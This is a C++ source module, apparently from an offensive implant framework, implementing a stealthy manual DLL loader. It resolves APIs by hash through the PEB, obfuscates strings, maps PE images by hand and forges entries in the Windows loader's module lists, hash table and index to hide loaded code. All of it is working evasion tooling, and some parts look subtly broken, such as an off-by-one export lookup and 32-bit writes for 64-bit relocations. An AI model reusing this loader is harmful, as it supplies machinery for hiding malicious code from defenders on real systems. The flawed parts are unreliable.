#include <core/include/modules.hpp>

using namespace Hash;
using namespace Opsec;
using namespace Utils;
using namespace Memory::Methods;

__attribute__((used, section(".rdata"))) wchar_t dot_dll[] = { 0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00 };
__attribute__((used, section(".rdata"))) wchar_t sys32w[] = {
	0x43,0x00,0x3a,0x00,0x2f,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,
	0x2f,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,0x32,0x00,0x00 };

namespace Modules {

    PLDR_DATA_TABLE_ENTRY FindModuleEntry(const uint32 hash) {
        const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

        for (auto next = head->Flink; next != head; next = next->Flink) {
            const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            const auto name = mod->BaseDllName;

            // TODO: need checks to prevent overflows tho unlikely
            wchar_t buffer[MAX_PATH] = { };

            if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
                return mod;
            }
        }

        return nullptr;
    }

    FARPROC FindExportAddress(const void *base, const uint32 hash) {
        FARPROC address = nullptr;

        const auto nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
        const auto exports = (PIMAGE_EXPORT_DIRECTORY) (base + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return address;
        }

		const auto functions = (uint32*) (U_PTR(base) + exports->AddressOfFunctions);
		const auto ordinals = (uint16*) (U_PTR(base) + exports->AddressOfNameOrdinals);
		const auto names = (uint32*) (U_PTR(base) + exports->AddressOfNames);
		
        for (auto index = 0; index < exports->NumberOfNames; index++) {
            const auto name = (char*) (U_PTR(base) + names[index]);

            char buffer[MAX_PATH] = { };

            if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
                address = (FARPROC) (U_PTR(base) + functions[ordinals[index]]); // NOTE: changed to index functions by ordinals[i]
                break;
            }
        }

        return address;
    }

	// TODO: string hash module_name
	UINT_PTR FindKernelModule(char *module_name) {
		HEXANE;

		void *buffer = nullptr;
		size_t buffer_size = 0;

		if (!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
			return 0;
		}

		while (ntstatus == STATUS_INFO_LENGTH_MISMATCH) {
			if (buffer) {
				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
			}

			if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &buffer, 0, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) ||
				!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
				return 0;
			}
		}

		if (!NT_SUCCESS(ntstatus)) {
			if (buffer) {
				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
			}
			return 0;
		}

		const auto modules = (PRTL_PROCESS_MODULES) buffer;
		if (!modules){
			return 0;
		}

		for (auto i = 0; i < modules->NumberOfModules; ++i) {
			const char *current_module_name = (char*) modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

			if (!MbsCompare(current_module_name, module_name)) {
				const uintptr_t result = (uintptr_t) modules->Modules[i].ImageBase;

				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
				return result;
			}
		}

		ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
		return 0;
	}

	// TODO: string hash function name 
	FARPROC FindKernelExport(HANDLE handle, uintptr_t base, const char *function) {
		HEXANE;

		UINT_PTR address = 0;
		SIZE_T exports_size = 0;
		PIMAGE_EXPORT_DIRECTORY export_data = nullptr;
		PIMAGE_EXPORT_DIRECTORY exports = nullptr;

		if (!base) {
			return 0;
		}

        IMAGE_NT_HEADERS nt_head = { };
		if (!ReadMemory(handle, &nt_head, (void*) base + ((PIMAGE_DOS_HEADER)base)->e_lfanew, sizeof(nt_head)) ||
			nt_head.Signature != IMAGE_NT_SIGNATURE) {
			goto defer;
		}

		exports = (PIMAGE_EXPORT_DIRECTORY) nt_head.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		exports_size = nt_head.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

		if (!exports || !exports_size) {
			goto defer;
		}

		if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**)&export_data, 0, (PSIZE_T)&exports_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			goto defer;
		}
		
		if (!ReadMemory(handle, export_data, C_PTR(base + U_PTR(exports)), exports_size)) {
			goto defer;
		}
		
		for (auto index = 0; index < export_data->NumberOfNames; index++) {
            const auto name = (char*) (base + ((uint32*) (base + exports->AddressOfNames))[index - 1]);

			if (MbsCompare(name, function) == 0) {
				const auto ord = (uint16*) (base + ((uint16*) (base + exports->AddressOfNameOrdinals))[index]);
				if (*ord <= 0x1000) {
					break;
				}

                address = (base + ((uint32*) (base + exports->AddressOfFunctions))[index]);
				if (address >= base + U_PTR(exports) && address <= base + U_PTR(exports) + exports_size) {
					address = 0; // function address is out of range, somehow (?)
				}

				break;
			}
		}

	defer:
		if (export_data) {
			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &export_data, &exports_size, MEM_RELEASE);
			export_data = nullptr;
		}

		return (FARPROC) address;
	} 

	UINT_PTR FindSection(const char* section_name, uintptr_t base, uint32_t *size) {

		uintptr_t sec_address = 0;
		size_t name_length = MbsLength(section_name);

		PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		PIMAGE_SECTION_HEADER sec_head = IMAGE_FIRST_SECTION(nt_head);

		for (auto i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER section = &sec_head[i];

			if (name_length == MbsLength((char*) section->Name)) {
				if (MemCompare(section_name, section->Name, name_length) == 0) {

					if (!section->VirtualAddress) {
						return 0;
					}
					if (size) {
						*size = section->Misc.VirtualSize;
					}

					sec_address = base + section->VirtualAddress;
				}
			}
		}

		return sec_address;
	}

    VOID InsertTailList(LIST_ENTRY *const head, LIST_ENTRY *const entry) {
        PLIST_ENTRY blink = head->Blink;

        entry->Flink   = head;
        entry->Blink   = blink;
        blink->Flink   = entry;
        head->Blink	= entry;
    }

    PLIST_ENTRY FindHashTable() {

        PLIST_ENTRY list = nullptr;
        PLIST_ENTRY head = nullptr;
        PLIST_ENTRY entry = nullptr;
        PLDR_DATA_TABLE_ENTRY current = nullptr;

        PPEB peb = PEB_POINTER;

        head = &peb->Ldr->InInitializationOrderModuleList;
        entry = head->Flink;

        do {
            current = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
            entry = entry->Flink;

            if (current->HashLinks.Flink == &current->HashLinks) {
                continue;
            }

            list = current->HashLinks.Flink;

            if (list->Flink == &current->HashLinks) {
                ULONG hash = LdrHashEntry(current->BaseDllName, true);

                list = (PLIST_ENTRY) ((size_t) current->HashLinks.Flink - hash * sizeof(LIST_ENTRY));
                break;
            }

            list = nullptr;
        } while (head != entry);

        return list;
    }

    BOOL AddHashTableEntry(PLDR_DATA_TABLE_ENTRY entry) {
        PPEB peb = PEB_POINTER;

        PLIST_ENTRY hash_table = FindHashTable();
        if (!hash_table) {
            return false;
        }

        INIT_LIST_ENTRY(&entry->HashLinks);

        // insert into hash table
        ULONG hash = LdrHashEntry(entry->BaseDllName, true);

        InsertTailList(&hash_table[hash], &entry->HashLinks);
        InsertTailList(&peb->Ldr->InLoadOrderModuleList, &entry->InLoadOrderLinks);
        InsertTailList(&peb->Ldr->InMemoryOrderModuleList, &entry->InMemoryOrderLinks);
        InsertTailList(&peb->Ldr->InInitializationOrderModuleList, &entry->InInitializationOrderLinks);

        return true;
    }

	// TODO: needs testing
    BOOL LocalLdrFindExportAddress(HMODULE base, const char *export_name, const uint16 ordinal, void **function) {

        PIMAGE_SECTION_HEADER section = nullptr;
        UINT8 local_buffer[MAX_PATH] = { };

        void *text_start = nullptr;
        void *text_end = nullptr;

        if (!base || (export_name && ordinal)) {
            return false;
        }

        PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);
        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }

        uint32 dot_text = TEXT;

        for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
            PIMAGE_SECTION_HEADER section = ITER_SECTION_HEADER(base, sec_index);

            uint32 sec_hash = HashStringA((char *) section->Name, MbsLength((char *) section->Name));
            if (MemCompare((void*) &dot_text, (void *) &sec_hash, sizeof(uint32))) {

                text_start = RVA(void*, base, section->VirtualAddress);
                text_end = RVA(void*, text_start, section->SizeOfRawData);
                break;
            }
        }

        if (!text_start || !text_end) {
            // NOTE: not sure why this would happen
            return false;
        }

        PIMAGE_DATA_DIRECTORY data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (data_dire->Size) {
            const IMAGE_EXPORT_DIRECTORY *exports = RVA(PIMAGE_EXPORT_DIRECTORY, base, data_dire->VirtualAddress);
            const uint32 n_entries = !export_name ? exports->NumberOfFunctions : exports->NumberOfNames;

            for (int entry_index = 0; entry_index < n_entries; entry_index++) {

                uint32 _ordinal = 0;
                bool found = false;

                if (export_name) {
                    uint32 *_name_rva = RVA(uint32*, base, exports->AddressOfNames + entry_index * sizeof(uint32));
                    char *name = RVA(char*, base, *_name_rva);

                    if (MbsCompare(name, export_name)) {
                        found = true;

                        int16 *_ord_rva = RVA(int16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(uint16));
                        _ordinal = exports->Base + *_ord_rva;
                    }
                } else {
                    int16 *_ord_rva = RVA(int16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(int16));
                    _ordinal = exports->Base + *_ord_rva;

                    if (_ordinal == ordinal) {
                        found = true;
                    }
                }

                if (found) {
                    CONST UINT32 *function_rva = RVA(uint32*, base, exports->AddressOfFunctions + sizeof(uint32) * (_ordinal - exports->Base));
                    VOID *fn_pointer = RVA(void*, base, *function_rva);

                    // NOTE: this is another module...
                    if (text_start > fn_pointer || text_end < fn_pointer) {

                        size_t full_length = MbsLength((char*) fn_pointer);
                        size_t lib_length = 0;

                        for (size_t i = 0; i < full_length; i++) {
                            if (((char*) fn_pointer)[i] == '.') {
                                lib_length = i;
                                break;
                            }
                        }

                        if (lib_length != 0) {
                            char *found_name = (char *) fn_pointer + lib_length + 1;

							MemSet(local_buffer, 0, MAX_PATH);
                            MbsConcat((char*) local_buffer, (char*) fn_pointer);
                            MbsConcat((char*) local_buffer, (char*) dot_dll);
                            
                            LDR_DATA_TABLE_ENTRY *lib_entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, found_name), lib_length));
                            if (!lib_entry || lib_entry->DllBase == base) {
                                return false;
                            }

                            if (!LocalLdrFindExportAddress((HMODULE) lib_entry->DllBase, found_name, 0, &fn_pointer)) {
                                return false;
                            }
                        }
                    }

                    *function = fn_pointer;
                    return true;
                }
            }
        }
        return false;
    }

    BOOL ResolveImports(const EXECUTABLE *module) {

        PIMAGE_IMPORT_BY_NAME import_name      = nullptr;
        PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc = nullptr;

        PIMAGE_THUNK_DATA first_thunk          = nullptr;
        PIMAGE_THUNK_DATA org_first            = nullptr;

        IMAGE_DATA_DIRECTORY *data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        UINT8 local_buffer[MAX_PATH] = { };

        if (data_dire->Size) {
            PIMAGE_IMPORT_DESCRIPTOR import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
            PIMAGE_IMPORT_DESCRIPTOR scan = import_desc;

            DWORD count = 0;
            for (; scan->Name; scan++) {
                count++;
            }

            for (; import_desc->Name; import_desc++) {
                HMODULE library = nullptr;

                const char *name = (char*) module->base + import_desc->Name;

                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, name), MbsLength(name)))) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
					MemSet(local_buffer, 0, MAX_PATH);
					MbsToWcs((wchar_t*) local_buffer, name, MbsLength(name));

					// NOTE: use MbsLength for the buffer length only 
                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, HashStringW((wchar_t*) local_buffer, WcsLength((wchar_t*) local_buffer)), nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

					// TODO: still has dangling pointer to _executable->strings/memory. big problem. fix it now
                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->FirstThunk);
                org_first = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->OriginalFirstThunk);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
                        if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

        // handle the delayed import table
        data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

        if (data_dire->Size) {
            delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, module->base, data_dire->VirtualAddress);

            for (; delay_desc->DllNameRVA; delay_desc++) {
                HMODULE library = nullptr;

                const CHAR *lib_name = (char*) module->base + delay_desc->DllNameRVA;
				const SIZE_T lib_length = MbsLength(lib_name);
                const UINT32 name_hash = HashStringA(MbsToLower((char*) local_buffer, lib_name), lib_length);

                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(name_hash)) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
					MemSet(local_buffer, 0, MAX_PATH);
					MbsToWcs((wchar_t*) local_buffer, lib_name, MbsLength(lib_name));

                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, HashStringW((wchar_t*) local_buffer, WcsLength((wchar_t*) local_buffer)), nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

                    // TODO: memory leak here. Do something with this new module.
                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportAddressTableRVA);
                org_first = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportNameTableRVA);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
                        if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

        return true;
    }

    PRTL_RB_TREE FindModuleIndex() {
        PRTL_BALANCED_NODE node = nullptr;
        PRTL_RB_TREE index      = nullptr;

        PLDR_DATA_TABLE_ENTRY entry = FindModuleEntry(NTDLL);
        SIZE_T end = 0;

        node = &entry->BaseAddressIndexNode;
        do {
            node = (PRTL_BALANCED_NODE) (node->ParentValue & ~0x7);
        } while (node->ParentValue & ~0x7);


        if (!node->Red) {
            UINT32 length = 0;
            SIZE_T begin = 0;

            PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, entry->DllBase, ((PIMAGE_DOS_HEADER) entry->DllBase)->e_lfanew);
            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);

            for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
                UINT32 sec_hash = HashStringA((char*) section->Name, MbsLength((char*) section->Name));
                UINT32 dot_data = DATA;

                if (MemCompare((void*) &dot_data, (void*) &sec_hash, sizeof(uint32)) == 0) {
                    begin = (size_t) entry->DllBase + section->VirtualAddress;
                    length = section->Misc.VirtualSize;
                    break;
                }

                ++section;
            }

            for (auto i = 0; i < length - sizeof(size_t); ++begin, ++i) {
                size_t stRet = MemCompare((void *) begin, &node, sizeof(size_t));

                if (stRet == sizeof(size_t)) {
                    end = begin;
                    break;
                }
            }

            if (end == 0) {
                return nullptr;
            }

            PRTL_RB_TREE rb_tree = (PRTL_RB_TREE) end;

            if (rb_tree && rb_tree->Root && rb_tree->Min) {
                index = rb_tree;
            }
        }

        return index;
    }


    BOOL MapModule(EXECUTABLE *module) {
        HEXANE;

        auto region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
        const auto pre_base = module->nt_head->OptionalHeader.ImageBase;

        module->base = pre_base;

        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
            module->base != pre_base) {
            module->base = 0;
            region_size = module->nt_head->OptionalHeader.SizeOfImage;

            if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
                return false;
            }
        }

        for (auto head_index = 0; head_index < module->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
            B_PTR(module->base)[head_index] = module->buffer[head_index];
        }

        for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
            for (auto sec_index = 0; sec_index < module->section->SizeOfRawData; sec_index++) {
                (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (module->buffer + module->section->PointerToRawData)[sec_index];
            }
        }

        UINT_PTR base_rva = module->base - pre_base;
        PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        // if non-zero rva and relocdir exists...
        if ((module->base - pre_base) && relocdir) {
            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

            do {
                PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;

                do {
                    switch (head->Type) {
                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                    }
                    head++;
                } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

                reloc = (PIMAGE_BASE_RELOCATION) head;
            } while (reloc->VirtualAddress);
        }

        module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
        return true;
    }

    BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, const void *base) {
        HEXANE;

        PRTL_RB_TREE index = FindModuleIndex();
        if (!index) {
            return false;
        }

        bool right_hand = false;
        PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY) ((size_t) index - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));

        do {
            // NOTE: looking for correct in-memory order placement according to RB Tree
            if (base < node->DllBase) {
                if (!node->BaseAddressIndexNode.Left) {
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else if (base > node->DllBase) {
                if (!node->BaseAddressIndexNode.Right) {
                    right_hand = true;
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else {
                node->DdagNode->LoadCount++;
            }
        } while (true);

        if (!ctx->win32.RtlRbInsertNodeEx(index, &node->BaseAddressIndexNode, right_hand, &entry->BaseAddressIndexNode)) {
            return false;
        }

        return true;
    }

    BOOL GetModulePath(EXECUTABLE *module, const uint32 name_hash) {
        HEXANE;

		WCHAR filename[MAX_PATH] = { };
		WIN32_FIND_DATAW data = { };
		BOOL success = false;

        if (!name_hash) {
            return false;
        }

		HANDLE handle = ctx->win32.FindFirstFileW((wchar_t*)sys32w, &data);
		if (INVALID_HANDLE_VALUE == handle) {
			goto defer;
		}

		// TODO: skip entries that are not *.dll
		do {
			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				continue;
			} else {
				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
					MemCopy(filename, data.cFileName, WcsLength(data.cFileName));
				}
			}
		} while (ctx->win32.FindNextFileW(handle, &data) != 0);

		if (!filename[0]) {
			goto defer;
		}

        module->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
		if (!module->cracked_name) {
			goto defer;
		}

        module->local_name = (wchar_t*) Malloc(MAX_PATH * sizeof(wchar_t));
        if (!module->local_name) {
            goto defer;
        }

        WcsConcat(module->local_name, sys32w);
		WcsConcat(module->local_name, filename);
		MemCopy(module->cracked_name, filename, WcsLength(filename));

		success = true;

	defer:
		if (!success) {
			if (module->cracked_name) {
				Free(module->cracked_name);
			}
			if (module->local_name) {
				Free(module->local_name);
			}
		}

		if (handle) {
			ctx->win32.NtClose(handle);
		}
        return success;
    }

    BOOL ReadModule(EXECUTABLE *module) {
        HEXANE;

        HANDLE handle = ctx->win32.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (handle == INVALID_HANDLE_VALUE) {
            return false;
        }

        SIZE_T size = ctx->win32.GetFileSize(handle, nullptr);
        if (size == INVALID_FILE_SIZE) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!ctx->win32.ReadFile(handle, module->buffer, size, (DWORD*) &module->size, nullptr)) {
            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &module->buffer, &module->size, 0);
            ctx->win32.NtClose(handle);
            return false;
        }

        ctx->win32.NtClose(handle);
        return true;
    }


    BOOL LinkModule(EXECUTABLE *module) {
		// TODO: needs tested
        HEXANE;

		PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, module->buffer, ((PIMAGE_DOS_HEADER)module->buffer)->e_lfanew);

        UNICODE_STRING full_name = { };
		UNICODE_STRING base_name = { };

        ctx->win32.RtlInitUnicodeString(&full_name, module->local_name);
        ctx->win32.RtlInitUnicodeString(&base_name, module->cracked_name);

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) Malloc(sizeof(LDR_DATA_TABLE_ENTRY));
        if (!entry) {
            return false;
        }

        // start setting the values in the entry
        ctx->win32.NtQuerySystemTime(&entry->LoadTime);

        // do the obvious ones
        entry->ReferenceCount = 1;
        entry->LoadReason     = LoadReasonDynamicLoad;
        entry->OriginalBase   = nt_head->OptionalHeader.ImageBase;

        // set the hash value
        entry->BaseNameHashValue = LdrHashEntry(entry->BaseDllName, false);

        // correctly add the base address to the entry
        AddModuleEntry(entry, (void *) module->base);

        // and the rest
        entry->ImageDll = true;
        entry->LoadNotificationsSent = true; 
        entry->EntryProcessed = true;
        entry->InLegacyLists  = true;
        entry->InIndexes      = true;
        entry->ProcessAttachCalled = true;
        entry->InExceptionTable    = false;
        entry->DllBase     = (void *) module->base;
        entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
        entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
        entry->BaseDllName = base_name;
        entry->FullDllName = full_name;
        entry->ObsoleteLoadCount = 1;
        entry->Flags = LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;

        // set the correct values in the Ddag node struct
        entry->DdagNode = (PLDR_DDAG_NODE) Malloc(sizeof(LDR_DDAG_NODE));
        if (!entry->DdagNode) {
            return 0;
        }

        entry->NodeModuleLink.Flink = &entry->DdagNode->Modules;
        entry->NodeModuleLink.Blink = &entry->DdagNode->Modules;

        entry->DdagNode->Modules.Flink = &entry->NodeModuleLink;
        entry->DdagNode->Modules.Blink = &entry->NodeModuleLink;
        entry->DdagNode->State = LdrModulesReadyToRun;
        entry->DdagNode->LoadCount = 1;

        // add the hash to the hash_table
        AddHashTableEntry(entry);

        // set the entry point
        entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(void *, module->base, nt_head->OptionalHeader.AddressOfEntryPoint);

        return true;
    }

    PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
        // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
        HEXANE;

        EXECUTABLE *module = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
		EXECUTABLE *image = nullptr;

        if (!module) {
            return nullptr;
        }

        module->success = false;
        module->link = true;

        switch (LOWORD(load_type)) {
            case LoadLocalFile: {
				// TODO: using name hashes for file search would need to hash every entry in the directory, creating performance overhead.
				// how bad would it perform? Is the stealth payoff worth it? needs testing.
				if (!GetModulePath(module, name_hash) || !ReadModule(module)) {
					goto defer;
				}

				break;
			}
            case LoadMemory: {
				module->size         = mem_size;
				module->buffer       = memory;
				module->cracked_name = name;
				module->local_name   = name;

				if (name == nullptr) {
					goto defer;
				}
				break;
			}

            default:
			break;
        }

        if (load_type & NoLink)
            module->link = false;

        if (name == nullptr) {
            name = module->cracked_name;
        }

        if ((load_type & LoadBof) != LoadBof) {
            if (LDR_DATA_TABLE_ENTRY *check_module = FindModuleEntry(HashStringW(name, WcsLength(name)))) {
                module->base = (uintptr_t) check_module->DllBase;
                module->success = true;

                goto defer;
            }
        }

        image = CreateImage(module->buffer);
        if (!ImageCheckArch(image)) {
            goto defer;
        }

        // TODO: DestroyImage(module);
        Free(image);

        // map the sections into memory
        if (!MapModule(module) || !ResolveImports(module)) {
            goto defer;
        }

        if (module->link) {
            if (!LinkModule(module)) {
                goto defer;
            }
        }

        // trigger tls callbacks, set permissions and call the entry point
		/*
				if (!BeginExecution(module)) {
					goto defer;
				}
				*/

        module->success = true;

        defer:
        // TODO: delete the _executable* and keep the base. that's all I need tbh...
        return module;
    }


    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
        // TODO:
        return false;
    }
}

